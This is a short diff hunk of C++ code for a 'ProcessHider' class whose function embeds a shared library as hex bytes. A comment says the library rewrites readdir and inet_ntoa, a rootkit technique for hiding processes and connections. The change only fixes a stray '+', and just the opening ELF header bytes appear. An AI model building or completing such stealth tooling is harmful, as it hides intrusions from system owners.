@@ -53,7 +53,7 @@ std::ostream &				operator<<(std::ostream & o, ProcessHider const & i)
 std::string ProcessHider::getRawLibrary()
 {
 	//.so rewriting readdir && inet_ntoa
-	std::string raw = + std::string("7f45 4c46 0201 0100 0000 0000 0000 0000\n")
+	std::string raw = std::string("7f45 4c46 0201 0100 0000 0000 0000 0000\n")
 					 + std::string("0300 3e00 0100 0000 300a 0000 0000 0000\n")
 					 + std::string("4000 0000 0000 0000 a81f 0000 0000 0000\n")
 					 + std::string("0000 0000 4000 3800 0600 4000 1c00 1900\n")
